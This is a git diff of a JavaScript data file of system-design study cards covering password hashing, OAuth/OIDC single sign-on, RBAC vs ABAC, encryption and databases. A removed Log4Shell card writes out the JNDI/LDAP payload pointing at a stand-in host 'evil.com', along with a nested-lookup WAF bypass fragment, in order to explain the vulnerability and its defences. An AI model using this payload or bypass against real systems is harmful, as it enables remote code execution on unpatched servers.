@@ -320,7 +320,6 @@ export const SYSTEM_DESIGN_TOPICS_BY_DAY = {
       "tabTitle": "Week 1 Checklist",
       "title": "Week 1 Core Mastery Checklist",
       "section": "Week 1 Review & Active Recall",
-      "whatItIs": "Self-assessment checklist to verify senior-level fluency on Week 1 systems concepts.",
       "architecture": "CHECKLIST OF CORE CONCEPTS:\n[ ] Can you derive QPS and storage requirements on a whiteboard without hesitation?\n[ ] Can you explain why HTTP/2 single connection causes transport HOL on mobile networks?\n[ ] Can you contrast Type-1 hypervisors with Linux cgroups and namespaces?\n[ ] Can you articulate why L4 load balancing is required in front of L7 Envoy gateways?\n[ ] Can you write the Little's Law formula ($L = \\lambda \\times W$) and explain queue collapse?",
       "tradeoffs": [
         "Textbook reciting vs. Senior intuition (Always link concepts to operational failure modes)",
@@ -348,49 +347,77 @@ export const SYSTEM_DESIGN_TOPICS_BY_DAY = {
       "tabTitle": "3.2 Password Hashing",
       "title": "3.2 How to Store Passwords Safely in a Database",
       "section": "Part 3 · Security, Auth & API Access",
-      "whatItIs": "Cryptographic defense against credential theft, rainbow tables, and GPU brute-force attacks.",
-      "architecture": "STORAGE & VERIFICATION:\nRegister: password + random salt ──► Slow Hash Function (Argon2id / bcrypt) ──► Store $argon2id$v=19$m=65536,t=3,p=4$salt$hash\nValidate: entered password + stored salt ──► Hash ──► Constant-time comparison (prevents timing side-channel leaks)\nPepper: Secret value stored outside database (in KMS/HSM) mixed into hash.",
+      "whatItIs": "Cryptographic defense against credential leaks, rainbow tables, and GPU brute-force cracking using slow memory-hard key derivation functions.",
+      "architecture": "STORAGE & VERIFICATION FLOW:\nRegister: password + unique random salt + secret pepper ──► Argon2id / bcrypt ──► $argon2id$v=19$m=65536,t=3,p=4$salt$hash\nVerify: crypto.timingSafeEqual(storedHash, computedHash) (Strict constant-time compare prevents timing side-channels)\nThreat Model: 16-byte salt defeats precomputation; memory-hardness defeats GPUs; pepper in HSM defeats DB dumps.",
       "tradeoffs": [
-        "SHA-256 (Fatal flaw: GPUs compute billions/sec; salting only defeats rainbow tables, not brute-force) vs. Memory-hard Argon2id / bcrypt",
-        "Tuning Work Factor: 100–250ms per verification. Capacity math: at 250ms, 100 logins/sec consumes 25 CPU cores purely on hashing!",
-        "Migrating Legacy Hashes: Lazy rehash on login vs. wrap-and-upgrade `argon2id(old_sha256_hash)`"
+        "SHA-256 (Fatal flaw: GPUs compute 30+ billion/sec; salting only defeats rainbow tables, not brute force) vs. Memory-hard Argon2id (NIST/OWASP #1)",
+        "Tuning Work Factor: 100–250ms per verification. Capacity math: 100 logins/sec @ 250ms consumes 25 CPU cores purely on hashing!",
+        "Migrating Legacy Hashes: Lazy re-hashing on login (upgrade transparently on successful auth) vs. dual-hash wrapping"
       ],
-      "keyTakeaway": "Unique salt per user + slow memory-hard hash (Argon2id/bcrypt) + constant-time comparison + pepper outside DB. Salting defeats precomputation; only slow hashing defeats brute force."
+      "keyTakeaway": "Unique salt per user + slow memory-hard hash (Argon2id) + constant-time comparison + pepper stored outside the DB. Salting defeats precomputed rainbow tables; only slow memory-hard hashing defeats GPU brute-force attacks."
     },
     {
       "id": "3.3",
-      "tabTitle": "3.3 Token vs HMAC",
-      "title": "3.3 Securing Web API Access: Token vs. HMAC",
+      "tabTitle": "3.3 SSO & OAuth/OIDC",
+      "title": "3.3 Single Sign-On (SSO): OAuth 2.0 vs. OpenID Connect (OIDC) vs. SAML",
       "section": "Part 3 · Security, Auth & API Access",
-      "whatItIs": "Comparing bearer token authentication with cryptographic request signing (HMAC) for public and B2B API access.",
-      "architecture": "WHAT TRAVELS ON THE WIRE:\n• Bearer Token: Authorization: Bearer ey... (The secret IS the token; anyone intercepting it can impersonate user)\n• HMAC Signature: Authorization: HMAC appid:signature\n  signature = HMAC(api_key, HTTP_Method + URI + Timestamp + Nonce + SHA256(Body))\n  Secret NEVER leaves either machine; proves possession without transmission!",
+      "whatItIs": "Decoupling identity and delegation: SAML 2.0 for enterprise XML identity federation, OAuth 2.0 for delegated authorization scopes, and OpenID Connect (OIDC) for modern REST/JSON identity authentication.",
+      "architecture": "OIDC AUTHORIZATION CODE WITH PKCE:\nBrowser/App ──1. Auth Request + code_challenge──► Authorization Server (IdP)\nBrowser/App ◄──2. Redirect with short-lived auth code (30s)────────┘\nApp Backend ──3. POST /token + auth code + code_verifier─────────► IdP\nApp Backend ◄──4. Returns ID Token (JWT) + Access Token + Refresh Token ┘\nIdentity: ID Token verifies AuthN. Access Token authorizes API calls.",
       "tradeoffs": [
-        "Bearer JWT (User-facing browsers/apps, simple header, relies purely on TLS for transit integrity) vs. HMAC (Server-to-server, payments, webhooks)",
-        "Replay Protection: Timestamp (±5 min window) + Redis cached Nonce defeats recorded replay attacks",
-        "Zero-Downtime Key Rotation: Dual active keys per client (Key 1 active while Key 2 is migrated)"
+        "OAuth 2.0 is AuthZ, NOT AuthN (Never use OAuth access tokens alone to identify users; use OIDC ID Tokens signed by IdP)",
+        "PKCE (Proof Key for Code Exchange) is mandatory for SPAs & mobile apps to prevent authorization code interception",
+        "SAML 2.0 (Enterprise Okta/Active Directory, XML signatures) vs OIDC (Modern mobile/web apps, lightweight JSON/JWT)"
       ],
-      "keyTakeaway": "Bearer token proves you have a secret; HMAC proves you know a secret without revealing it. Tokens for user apps; signatures for server-to-server and money-moving APIs."
+      "keyTakeaway": "SAML 2.0 is for enterprise legacy identity federation; OAuth 2.0 is an authorization framework for API permissions; and OpenID Connect (OIDC) is the modern authentication standard built on OAuth 2.0. Always use Authorization Code Flow with PKCE for single sign-on."
+    },
+    {
+      "id": "3.4",
+      "tabTitle": "3.4 RBAC vs ABAC",
+      "title": "3.4 Role-Based Access Control (RBAC) vs. Attribute-Based Access Control (ABAC)",
+      "section": "Part 3 · Security, Auth & API Access",
+      "whatItIs": "Authorization architecture: static role bindings (RBAC) vs dynamic evaluation over Subject, Action, Resource, and Environment attributes (ABAC) and graph-based relationship tuples (ReBAC / Google Zanzibar).",
+      "architecture": "DECOUPLED AUTHORIZATION (OPA PDP):\nRequest ──► API Gateway / Service Middleware (PEP) ──Ask Decision──► Open Policy Agent (PDP)\nEvaluation: Input JSON (Subject clearance, Resource tenant, Action, Environment IP/time) matched against versioned Rego policy rules.\nResult: Sub-millisecond Allow/Deny returned to PEP.",
+      "tradeoffs": [
+        "Role Explosion in RBAC (Combinatorial roles like Finance_EU_Read_Weekend) vs Dynamic ABAC attributes",
+        "Decoupled Policy (Use Open Policy Agent as a local sidecar so security rules update via GitOps without redeploying code)",
+        "ReBAC & Zanzibar (Use relationship tuples object#relation@user for Google Docs/GitHub collaborative ownership)"
+      ],
+      "keyTakeaway": "Use RBAC for coarse-grained functional access; use ABAC or ReBAC for fine-grained resource and contextual authorization. Decouple authorization logic completely from application code using dedicated policy engines like Open Policy Agent (OPA) or Google Zanzibar-inspired ReBAC."
     },
     {
       "id": "3.5",
-      "tabTitle": "3.5 Log4Shell Zero-Day",
-      "title": "3.5 Log4Shell: Anatomy of a Zero-Day",
+      "tabTitle": "3.5 Encryption: AES/RSA/ECC",
+      "title": "3.5 Symmetric vs. Asymmetric Encryption: AES vs. RSA vs. ECC",
       "section": "Part 3 · Security, Auth & API Access",
-      "whatItIs": "Analysis of the CVE-2021-44228 vulnerability where string interpolation in logging allowed remote code execution via JNDI/LDAP.",
-      "architecture": "THE EXPLOITATION CHAIN:\nAttacker sends payload: ${jndi:ldap://evil.com/a} in User-Agent header\n  │\n  ▼ 1. Application logs string via Log4j 2.x (message lookup evaluator)\n  ▼ 2. JNDI resolves LDAP URL (outbound socket connection to attacker server)\n  ▼ 3. Remote LDAP server returns serialized Java Class\n  ▼ 4. JVM deserializes and executes class → Remote Code Execution (RCE) as app user!",
+      "whatItIs": "Foundational cryptography for data at rest and in transit: high-throughput symmetric ciphers (AES-256-GCM) paired with asymmetric key pairs (ECC/RSA) in hybrid cryptosystems and cloud KMS envelope encryption.",
+      "architecture": "AWS KMS ENVELOPE ENCRYPTION:\n1. App calls KMS GenerateDataKey(kek_id) → KMS returns Plaintext DEK + Encrypted DEK\n2. App encrypts bulk data locally with AES-256-GCM using Plaintext DEK (GB/s hardware speed)\n3. App wipes Plaintext DEK from RAM immediately\n4. App stores Encrypted DEK alongside Ciphertext on disk/S3 (Zero KMS throughput bottleneck!)",
       "tradeoffs": [
-        "Untrusted Input to Interpreters (Logging was assumed to be a passive sink; it was actually an expression evaluator)",
-        "Default-Deny Egress (Blocking arbitrary outbound internet connections from backend servers breaks the attack chain even on unpatched systems)",
-        "WAF vs. Code Patching (WAF regex is easily bypassed via nested lookups `${${lower:j}ndi...}`; fix must be at runtime level)"
+        "Symmetric (AES-256-GCM: ultra-fast, 5+ GB/s AES-NI) vs Asymmetric (ECC/RSA: 1000x slower, solves key distribution)",
+        "ECC vs RSA (256-bit ECC matches 3072-bit RSA with 10x faster signatures and tiny network packet size)",
+        "The ECB Penguin Trap (Never use AES in ECB mode; always use AEAD modes like AES-GCM or ChaCha20-Poly1305 to guarantee confidentiality AND tamper-proof integrity)"
       ],
-      "keyTakeaway": "Log4Shell is the canonical example of untrusted input reaching an interpreter. In design discussions, cite dependency inventory (SBOM), least privilege, and default-deny egress."
+      "keyTakeaway": "Symmetric encryption (AES-256-GCM) secures bulk data at rest and high-throughput network channels with hardware acceleration; asymmetric encryption (ECC / RSA) solves key exchange and digital identity. In system design, always propose a Hybrid Cryptosystem (TLS 1.3) for data in transit and KMS Envelope Encryption (KEK + DEK) for data at rest, strictly using AEAD modes."
     }
   ],
   "9": [
     {
       "id": "4.1",
-      "tabTitle": "4.1 Isolation & MVCC",
-      "title": "4.1 Database Isolation Levels and MVCC",
+      "tabTitle": "4.1 SQL vs NoSQL",
+      "title": "4.1 Relational (SQL) vs. Non-Relational (NoSQL) Databases",
+      "section": "Part 4 · Databases & Consistency",
+      "whatItIs": "Architectural selection between relational databases (PostgreSQL, MySQL) and non-relational families (Document, Key-Value, Wide-Column, Graph) based on schema discipline, ACID guarantees, and horizontal partition scale.",
+      "architecture": "DATA MODELING TRADEOFF:\n• SQL Normalized: USERS ──1:N──► ORDERS ──1:N──► ORDER_ITEMS (Atomic joins, zero redundancy, vertical scaling)\n• NoSQL Denormalized: User document embeds orders or hash partitioned by partition key (Single I/O read, horizontal scale across 1,000 nodes)\n• Polyglot Persistence: PostgreSQL (financial ledger) + DynamoDB (user events) + Redis (sessions) + Elasticsearch (search)",
+      "tradeoffs": [
+        "ACID vs BASE (Strict multi-table ACID transactions vs distributed eventual consistency)",
+        "Schema-on-Write (SQL DDL migrations) vs Schema-on-Read (NoSQL dynamic JSON)",
+        "The NoSQL Query Pattern Trap (Partition keys must match exact query patterns; ad-hoc queries cause catastrophic full table scans)"
+      ],
+      "keyTakeaway": "Never pick a database based on hype. Choose SQL when ACID transactions, relational integrity, and ad-hoc joins are non-negotiable. Choose NoSQL when horizontal write throughput, high partition availability, and predictable key-value access patterns dominate. In modern enterprise systems, propose Polyglot Persistence synchronized via Change Data Capture (CDC)."
+    },
+    {
+      "id": "4.1-mvcc",
+      "tabTitle": "Isolation & MVCC",
+      "title": "Database Isolation Levels and MVCC",
       "section": "Part 4 · Databases & Consistency",
       "whatItIs": "Database isolation levels govern how concurrent transactions observe each other's writes, balancing transactional correctness against engine throughput.",
       "architecture": "MVCC VERSION CHAIN (Undo Log):\nRow: balance=100 (txn_id=200 committed)\nTxn A starts (Read View 201) → writes balance=200 (uncommitted)\nUndo log: [balance=200, txn_id=201] ──roll_pointer──► [balance=100, txn_id=200]\nTxn B starts (Read View 202) → reads balance=100 (skips uncommitted 201!)\nReaders NEVER block writers, writers NEVER block readers!",
